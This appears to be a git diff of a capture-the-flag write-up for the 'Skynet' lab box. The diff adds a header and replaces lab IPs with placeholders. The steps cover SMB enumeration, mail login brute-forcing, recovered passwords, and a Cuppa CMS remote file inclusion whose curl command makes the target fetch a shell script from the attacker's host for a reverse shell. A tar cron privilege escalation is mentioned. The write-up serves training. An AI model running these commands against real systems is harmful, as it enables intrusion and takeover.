@@ -1,31 +1,38 @@
 # Skynet
 
-1. Lets scan the network first: `nmap -sV 10.10.158.148`. This shows some interesting results specially the samba shares. Lets enumerate it: `smbclient -L 10.10.158.148 -N`. This shows some shares in which 2 seems to be interesting. Lets try to login for both of them:
+## Challenge Information
+- **Challenge Name**: Skynet
+- **Category**: Web Penetration Testing
+- **Difficulty Level**: Easy
+
+## Analysis
+
+1. Lets scan the network first: `nmap -sV <ip_address>`. This shows some interesting results specially the samba shares. Lets enumerate it: `smbclient -L <ip_address> -N`. This shows some shares in which 2 seems to be interesting. Lets try to login for both of them:
 ```
-smbclient //10.10.158.148/anonymous -N
-smbclient //10.10.158.148/milesdyson -N
+smbclient //<ip_address>/anonymous -N
+smbclient //<ip_address>/milesdyson -N
 ```
 The second one denied the access but the first one got logged in. Lets enumerate the share. There is a file named **attention.txt** in which **miles** instructs the users to change their password. There is also a directory named **logs**. This directory contains 3 log files. Two of them are empty and one contains some words which seems to be passwords. Download this file using `get` command.
 
 2. Now, we have a wordlist for the password and the username **milesdyson** is also known. But we do not have any page for the login for the email. So now lets enumerate some directories:
 ```
-ffuf -u http://10.10.158.148/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -mc 200,301,302,403
+ffuf -u http://<ip_address>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -mc 200,301,302,403
 ```
 This reveals only one directory that is accessible with status code 202: **squirrelmail**. So, lets open this directory, and boom! It opens a login page. Capture a login request in burpsuite and use intruder to brute force with the found log file. This will reveal the correct password: **cyborg007haloterminator**. Now login with this password to the milesdyson emails.
 
-3. Open the first mail. There is new password given with some special characters. Lets try to login with this passowrd to the smb share of miles: `smbclient //10.10.158.148/milesdyson -U milesdyson`. This command will prompt for the password. Use the following password: **)s{A&2Z=F^n_E.B`**. Now, we get logged into the miles share. Enumerate with `ls` command. Go to the **notes** directory. Again `ls` and then download the **important.txt** file. Read this file and it contains the hidden directory: **/45kra24zxs28v3yd**.
+3. Open the first mail. There is new password given with some special characters. Lets try to login with this passowrd to the smb share of miles: `smbclient //<ip_address>/milesdyson -U milesdyson`. This command will prompt for the password. Use the following password: **)s{A&2Z=F^n_E.B`**. Now, we get logged into the miles share. Enumerate with `ls` command. Go to the **notes** directory. Again `ls` and then download the **important.txt** file. Read this file and it contains the hidden directory: **/45kra24zxs28v3yd**.
 
 4. The vulnerability in which you can include a remote file for malicious purposes is called **remote file inclusion**.
 
 5. Now, lets enumerate the hidden directory for more files:
 ```
-ffuf -u http://10.10.158.148/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -mc 200,301,302,403
+ffuf -u http://<ip_address>/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -mc 200,301,302,403
 ```
 This reveals another directory named **administrator**. Opening this directory opens a **Cupa CMS**. Lets find any vulnerability for RFI for this on exploit db, and we get an exploit with **EDB-ID 25971**.
 
 6. Using this exploit explanation, we will use the following url to get a reverse shell:
 ```
-curl http://10.10.14.183/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php\?urlConfig\=http://10.21.110.209:8080/shell.php
+curl http://<ip_address>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php\?urlConfig\=http://<your_ip>:8080/shell.php
 ```
 Before this, host the shell.php file on a python server and start a netcat session as well. Running this command in the terminal will give you milesdyson shell. Retrieve the flag: `cat /home/milesdyson/user.txt`
 
@@ -62,4 +69,3 @@ When the cron job runs, `tar` will hit these option-like filenames and **execute
 11. Finally, retrieve the root flag: `cat /root/root.txt`
 
 ---
-
